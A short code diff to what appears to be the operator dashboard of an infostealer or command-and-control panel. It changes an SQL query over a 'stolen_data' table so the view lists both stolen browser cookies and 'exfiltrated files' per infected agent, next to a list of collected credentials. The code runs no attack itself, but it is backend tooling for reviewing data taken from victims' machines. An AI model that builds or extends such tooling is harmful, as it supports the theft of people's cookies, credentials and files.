@@ -347,10 +347,9 @@ def init_view_routes(app):
         
         credentials = [dict(zip([col[0] for col in c.description], row)) for row in c.fetchall()]
         
-        # Query for stolen cookies data
-        c.execute('''SELECT id, agent_id, browser, system_info, timestamp 
+        # Query for stolen data (cookies and exfiltrated files)
+        c.execute('''SELECT id, agent_id, browser, data_type, system_info, timestamp 
                     FROM stolen_data 
-                    WHERE data_type='cookies'
                     ORDER BY timestamp DESC''')
         
         cookies_data = []
